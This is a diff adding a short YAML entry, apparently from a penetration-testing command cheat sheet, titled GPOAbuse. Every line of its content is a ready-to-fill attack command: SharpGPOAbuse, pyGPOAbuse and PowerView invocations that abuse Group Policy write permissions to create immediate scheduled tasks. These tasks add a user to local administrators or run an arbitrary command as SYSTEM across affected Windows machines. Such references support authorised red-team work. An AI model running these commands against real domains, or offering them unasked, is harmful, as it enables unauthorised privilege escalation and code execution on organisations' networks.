@@ -1,0 +1,13 @@
+name: GPOAbuse
+description: Abuse GPO write permissions for code execution on affected systems
+commands:
+- '# SharpGPOAbuse - Add immediate scheduled task'
+- SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <USER> /add' --GPOName '<GPO_NAME>'
+- ''
+- '# pyGPOAbuse (Linux)'
+- pygpoabuse.py '<DOMAIN>/<USER>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'net localgroup administrators <USER> /add' -dc-ip <DC_IP>
+- ''
+- '# PowerView - New immediate task'
+- New-GPOImmediateTask -TaskName 'Update' -GPODisplayName '<GPO_NAME>' -Command cmd -CommandArguments '/c <COMMAND>' -Force
+opsec: []
+references: []
